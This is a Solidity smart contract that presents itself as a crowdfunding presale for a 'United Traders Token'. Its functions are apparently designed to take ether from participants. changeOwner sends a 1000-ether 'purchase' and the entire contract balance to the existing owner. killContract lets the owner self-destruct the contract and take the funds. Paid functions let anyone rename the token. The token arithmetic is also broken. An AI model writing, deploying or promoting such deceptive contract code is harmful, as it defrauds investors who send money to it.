1 pragma solidity ^0.4.19;
2 
3 
4 /// @title  United Traders Token presale - uttoken.io (UTT) - crowdfunding code
5 /// Whitepaper:
6 /// https://investment-prod.s3.amazonaws.com/whitepaper/Whitepaper_Full-version_en.pdf
7 
8 contract UnitedTradersToken {
9     string public name = "United Traders Token";
10     string public symbol = "UTT";
11     uint8 public constant decimals = 9;  
12     address public owner;
13 
14     uint256 public constant tokensPerEth = 1;
15     uint256 public constant howManyEthersToBecomeOwner = 1000 ether;
16     uint256 public constant howManyEthersToKillContract = 500 ether;
17     uint256 public constant howManyEthersToChangeSymbolName = 400 ether;
18     
19     bool public funding = true;
20 
21     // The current total token supply.
22     uint256 totalTokens = 1000;
23 
24     mapping (address => uint256) balances;
25     mapping (address => mapping (address => uint256)) allowed;
26 
27     event Transfer(address indexed _from, address indexed _to, uint256 _value);
28     event Migrate(address indexed _from, address indexed _to, uint256 _value);
29     event Refund(address indexed _from, uint256 _value);
30     event Approval(address indexed _owner, address indexed _spender, uint256 _value);
31 
32     function UnitedTradersToken() public {
33         owner = msg.sender;
34     }
35 
36     function changeNameSymbol(string _name, string _symbol) payable external
37     {
38         if (msg.sender==owner || msg.value >=howManyEthersToChangeSymbolName)
39         {
40             name = _name;
41             symbol = _symbol;
42         }
43     }
44     
45     
46     function changeOwner (address _newowner) payable external
47     {
48         if (msg.value>=howManyEthersToBecomeOwner)
49         {
50             owner.transfer(msg.value);
51             owner.transfer(this.balance);
52             owner=_newowner;
53         }
54     }
55 
56     function killContract () payable external
57     {
58         if (msg.sender==owner || msg.value >=howManyEthersToKillContract)
59         {
60             selfdestruct(owner);
61         }
62     }
63     /// @notice Transfer `_value` UTT tokens from sender's account
64     /// `msg.sender` to provided account address `_to`.
65     /// @notice This function is disabled during the funding.
66     /// @dev Required state: Operational
67     /// @param _to The address of the tokens recipient
68     /// @param _value The amount of token to be transferred
69     /// @return Whether the transfer was successful or not
70     function transfer(address _to, uint256 _value) public returns (bool) {
71         // Abort if not in Operational state.
72         
73         var senderBalance = balances[msg.sender];
74         if (senderBalance >= _value && _value > 0) {
75             senderBalance -= _value;
76             balances[msg.sender] = senderBalance;
77             balances[_to] += _value;
78             Transfer(msg.sender, _to, _value);
79             return true;
80         }
81         return false;
82     }
83 
84     function totalSupply() external constant returns (uint256) {
85         return totalTokens;
86     }
87 
88     function balanceOf(address _owner) external constant returns (uint256) {
89         return balances[_owner];
90     }
91 
92 
93     function transferFrom(
94          address _from,
95          address _to,
96          uint256 _amount
97      ) public returns (bool success) {
98          if (balances[_from] >= _amount
99              && allowed[_from][msg.sender] >= _amount
100              && _amount > 0
101              && balances[_to] + _amount > balances[_to]) {
102              balances[_from] -= _amount;
103              allowed[_from][msg.sender] -= _amount;
104              balances[_to] += _amount;
105              return true;
106          } else {
107              return false;
108          }
109   }
110 
111     function approve(address _spender, uint256 _amount) public returns (bool success) {
112          allowed[msg.sender][_spender] = _amount;
113          Approval(msg.sender, _spender, _amount);
114          
115          return true;
116      }
117 // Crowdfunding:
118 
119     /// @notice Create tokens when funding is active.
120     /// @dev Required state: Funding Active
121     /// @dev State transition: -> Funding Success (only if cap reached)
122     function () payable external {
123         // Abort if not in Funding Active state.
124         // The checks are split (instead of using or operator) because it is
125         // cheaper this way.
126         if (!funding) revert();
127         
128         // Do not allow creating 0 or more than the cap tokens.
129         if (msg.value == 0) revert();
130         
131         var numTokens = msg.value * (1000.0/totalTokens);
132         totalTokens += numTokens;
133 
134         // Assign new tokens to the sender
135         balances[msg.sender] += numTokens;
136 
137         // Log token creation event
138         Transfer(0, msg.sender, numTokens);
139     }
140 }